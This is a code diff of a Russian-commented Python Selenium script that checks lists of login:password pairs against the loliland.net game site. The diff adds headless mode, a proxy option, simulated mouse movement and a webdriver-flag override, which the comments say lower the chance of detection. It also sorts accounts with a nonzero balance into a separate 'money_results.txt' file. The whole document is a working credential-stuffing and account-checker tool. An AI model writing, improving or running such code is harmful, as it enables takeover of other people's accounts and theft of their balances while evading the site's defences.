@@ -5,6 +5,7 @@ from selenium.webdriver.support import expected_conditions as EC  # ожидае
 from selenium.webdriver.support.ui import WebDriverWait  # ожидания
 import time  # для паузы в действиях
 from fake_useragent import UserAgent 
+from selenium.webdriver.common.action_chains import ActionChains
 
 
 # Создаем экземпляр UserAgent
@@ -16,21 +17,27 @@ random_user_agent = ua.random
 # Настройки браузера
 options = webdriver.ChromeOptions()
 options.add_argument(f"user-agent={random_user_agent}")  # Устанавливаем случайный пользовательский агент
-#options.add_argument("--headless")  # Закомментировать, если нужен видимый браузер
-
+options.add_argument("--headless")  # Закомментировать, если нужен видимый браузер
 # для меньшего шанса обнаружения
 options.add_argument("--disable-gpu")
 options.add_argument("--no-sandbox")
 options.add_argument("--disable-dev-shm-usage")
 options.add_argument("--remote-debugging-port=9222")
+#options.add_argument('--proxy-server=IP:PORT') использование прокси
 
-driver = webdriver.Chrome(options=options)  # инициализация браузера с заданными настройками
-driver.execute_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")
+# инициализация браузера с заданными настройками
+driver = webdriver.Chrome(options=options)  
+driver.execute_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})") # 
+
+# эмуляция движения мышки
+action = ActionChains(driver)
+action.move_by_offset(random.randint(100, 400), random.randint(100, 400)).perform()
 
 # Файлы для входа и результатов
 input_file = "accounts_check.txt"
 output_file = "results.txt"
-
+output_best_file = "money_results.txt"
+ 
 cnt = 0
 
 try:
@@ -39,6 +46,7 @@ try:
         accounts = file.readlines()
 
     results = []
+    best_results = []
 
     # заходим на сайт
     driver.get("https://loliland.net/start")
@@ -75,8 +83,13 @@ try:
             try:
                 balance_element = driver.find_element(By.XPATH, "//div[contains(@class, 'badge green')]")
                 balance = balance_element.text  # Получаем текст, который содержит баланс
-                results.append(f"✅ Успешный вход! {login}:{password} Баланс игрока: {balance}")  # Записываем баланс в результат аккаунта 
-                print(f"✅ Успешный вход! {login}:{password} Баланс игрока: {balance}")   
+                print(balance)
+                if balance[0] != '0':
+                    print(f"🔥🔥🔥 Успешный вход! {login}:{password} Баланс игрока: {balance}")  
+                    best_results.append(f"🔥🔥🔥 Успешный вход! {login}:{password} Баланс игрока: {balance}") 
+                else:
+                    results.append(f"✅ Успешный вход! {login}:{password} Баланс игрока: {balance}") 
+                    print(f"✅ Успешный вход! {login}:{password} Баланс игрока: {balance}")   
 
                 # Ждем, пока кнопка "Выйти" станет доступной
                 WebDriverWait(driver, 20).until(EC.element_to_be_clickable((By.XPATH, "//div[contains(@class, 'button_profile') and contains(text(), 'Выйти')]")))
@@ -87,12 +100,16 @@ try:
                 print(f"❌ Не удалось выйти из аккаунта: {e}")
 
         except Exception as e:
-            results.append(f"❌ Ошибка входа! {login}:{password}")
+            #results.append(f"❌ Ошибка входа! {login}:{password}")
             print(f"❌ Ошибка входа! {login}:{password}")
 
     # Записываем результаты в файл
     with open(output_file, "w") as file:
         for result in results:
+            file.write(result + "\n")
+
+    with open(output_best_file, "w") as file:
+        for result in best_results:
             file.write(result + "\n")
 
 finally:
